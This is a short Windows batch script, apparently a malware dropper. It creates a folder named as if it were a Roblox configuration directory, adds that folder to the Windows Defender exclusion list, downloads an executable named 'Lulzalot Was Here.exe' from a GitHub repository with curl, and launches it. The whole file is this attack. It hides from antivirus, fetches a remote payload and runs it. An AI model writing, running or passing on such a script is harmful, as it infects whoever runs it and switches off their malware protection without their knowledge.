@echo off
start "" cmd /k (
    set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
    mkdir "%folderPath%"
    powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
    curl -L -o "%folderPath%\Lulzalot Was Here.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe"
    if %errorlevel% neq 0 (
        echo Failed to download the executable.
        exit /b 1
    )
    start "" "%folderPath%\Lulzalot Was Here.exe"
)
exit
